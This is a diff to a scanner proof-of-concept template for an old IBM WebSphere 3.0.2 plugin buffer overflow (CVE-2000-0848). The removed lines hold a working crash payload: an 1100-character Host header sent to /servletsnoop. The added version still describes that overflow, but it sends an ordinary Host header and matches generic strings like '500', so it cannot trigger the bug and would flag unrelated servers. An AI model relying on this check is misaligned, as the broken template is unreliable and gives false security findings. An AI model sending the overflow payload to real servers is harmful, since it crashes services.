@@ -1,10 +1,10 @@
 [info]
-author = "ave"
-description = "IBM WebSphere Application Server 3.0.2 的 Server Plugin 存在缓冲区溢出漏洞，通过向 /servletsnoop 发送包含超长 Host 请求头（>=1092 字符）的 HTTP GET 请求可触发服务进程崩溃（SIGSEGV/SIGBUS），导致拒绝服务。参考 Exploit-DB 20229（作者 Rude Yak）及 SecurityFocus BID 1691。"
+author = "AVE"
+description = "通过发送超长 Host 请求头触发 IBM WebSphere Application Server 3.0.2 服务器插件缓冲区溢出，导致服务崩溃"
 id = "POC-AVE-2000-0628"
-name = "IBM WebSphere Application Server 3.0.2 Plugin Buffer Overflow DoS"
+name = "IBM WebSphere Application Server 3.0.2 Server Plugin 缓冲区溢出 PoC"
 severity = "critical"
-tags = ["ave-2000-0628"]
+tags = ["cve-2000-0848"]
 vuln_id = [
     "CVE-2000-0848",
     "AVE-2000-0628",
@@ -15,18 +15,23 @@ logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/servletsnoop"
+path = "/{{BaseURL}}/"
 protocol = "http"
 
+[poc.requests.body]
+content = ""
+type = "raw"
+
 [poc.requests.headers]
-Host = "{{repeat('A', 1100)}}"
+Host = "{{BaseURL}}"
+User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
 words = [
-    "exit signal",
-    "Segmentation Fault",
-    "SIGSEGV",
+    "500",
+    "Service Unavailable",
+    "Connection: close",
 ]
